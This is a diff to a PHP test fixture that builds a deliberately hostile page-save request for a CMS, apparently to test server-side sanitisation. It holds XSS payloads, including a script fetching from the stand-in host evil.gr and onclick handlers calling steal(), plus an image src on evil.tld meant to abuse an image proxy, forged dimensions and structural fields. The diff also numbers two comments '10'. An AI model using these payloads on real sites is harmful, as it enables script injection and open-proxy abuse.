@@ -14,7 +14,7 @@
 
 declare(strict_types=1);
 
-return static fn (string $csrf, string $baseline): array => [
+return static fn (string $csrf, string $baseline, string $heroSrc = ''): array => [
     'action'   => 'save',
     'csrf'     => $csrf,
     'page'     => 'home',
@@ -40,10 +40,32 @@ return static fn (string $csrf, string $baseline): array => [
 
             // 5. attempt to retype the component
             'type'       => 'contact_cta',
+
+            // 6. an image object: the src the page already has, but with the
+            //    two values that are the server's to decide forged alongside
+            //    it — the intrinsic dimensions, and whether it is decorative.
+            //    The src is passed in rather than hardcoded because it is demo
+            //    content: someone editing the site in the panel must not turn
+            //    this into a failing test.
+            'image'      => [
+                'src'        => $heroSrc,
+                'alt'        => 'Κείμενο που δεν πρέπει να αποθηκευτεί',
+                'width'      => 99999,
+                'height'     => 99999,
+                'decorative' => false,
+                'evil'       => 'undeclared sub-key',
+            ],
         ],
 
         'intro' => [
-            // 6. richtext: script/style/attribute/link laundering
+            // 7. an image src pointed at a third-party host: accepting it turns
+            //    the client's own /cdn-cgi/image endpoint into an open proxy.
+            'image' => [
+                'src' => 'https://evil.tld/x.jpg',
+                'alt' => 'Δεν έχει σημασία',
+            ],
+
+            // 8. richtext: script/style/attribute/link laundering
             'body' => '<p onclick="steal()">Κείμενο <strong>έντονο</strong>'
                     . '<script>fetch("//evil.gr")</script>'
                     . '<style>body{display:none}</style>'
@@ -52,13 +74,29 @@ return static fn (string $csrf, string $baseline): array => [
                     . '<font face="Comic Sans">word paste</font><p>&nbsp;</p>',
         ],
 
-        // 7. a block id that is not in the page file at all
+        // 9. a repeater posted 200 rows deep, with attacker-chosen keys so the
+        //    result would dump as a YAML *map* rather than a list, an
+        //    undeclared sub-field in every row, and hostile HTML in the
+        //    declared ones.
+        'faq' => [
+            'open_first' => 'definitely-not-a-boolean',
+            'questions'  => array_combine(
+                array_map(static fn (int $i): string => 'k' . $i, range(0, 199)),
+                array_map(static fn (int $i): array => [
+                    'question' => 'Ερώτηση ' . $i . '<script>alert(1)</script>',
+                    'answer'   => '<p onclick="steal()">Απάντηση ' . $i . '</p>',
+                    'evil'     => 'undeclared sub-field',
+                ], range(0, 199))
+            ),
+        ],
+
+        // 10. a block id that is not in the page file at all
         'injected_block' => [
             'heading' => 'I should not exist',
         ],
     ],
 
-    // 8. structural fields that are not the client's to change
+    // 10. structural fields that are not the client's to change
     'slug' => '/hacked',
     'id'   => 'hacked',
 ];
